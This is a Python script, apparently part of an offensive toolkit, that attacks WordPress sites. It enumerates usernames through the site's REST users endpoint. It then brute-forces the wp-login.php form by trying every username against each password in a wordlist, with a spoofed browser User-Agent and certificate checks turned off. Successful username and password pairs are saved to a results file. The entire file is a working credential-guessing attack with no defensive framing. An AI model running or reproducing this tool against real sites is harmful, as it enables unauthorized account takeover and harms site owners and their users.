from assets.colors.colors import colors
import requests
from bs4 import BeautifulSoup
import os

session = requests.Session()


def get_usernames(wordpress_url):
    api_url = f"{wordpress_url}/wp-json/wp/v2/users"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}

    response = session.get(api_url, headers=headers, verify=False)
    if response.status_code == 200:
        users = response.json()
        usernames = [user['slug'] for user in users]
        return usernames
    else:
        print(f"Failed to fetch usernames from API. Error: {response.text}")
        return []


def login_to_wordpress(wordpress_url, username, password, results_file):
    login_url = f"{wordpress_url}/wp-login.php"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    login_response = session.post(login_url, data=payload, headers=headers, verify=False)
    if 'login_error' not in login_response.text:
        result = f"{wordpress_url} {username} => {password}"
        with open(results_file, 'a') as file:
            file.write(result + '\n')
        
        print(f"[{colors.green}✔{colors.reset}] Login successful for {username} => {password}")
    else:
        print(f"[{colors.red}✗{colors.reset}] Login failed for {username} => {password}")



def wpExp():
    wordpress_url = input("Enter the URL of the WordPress site: ")

    usernames = get_usernames(wordpress_url)
    if not usernames:
        print("No usernames found.")
        return

    print("Extracted usernames from API:")
    for username in usernames:
        print(username)

    password_file = input("Enter the path to the file containing passwords: ")
    print(f"Trying login to : {colors.magenta}{wordpress_url}{colors.reset}")
    with open(password_file, 'r') as file:
        passwords = file.readlines()

    results_file = "result/wpLogin.txt"
    if not os.path.exists("result"):
        os.makedirs("result")  

    for password in passwords:
        password = password.strip()
        for username in usernames:
            login_to_wordpress(wordpress_url, username, password, results_file)

    print(f"Results saved to {results_file}")

if __name__ == '__main__':
    wpExp()
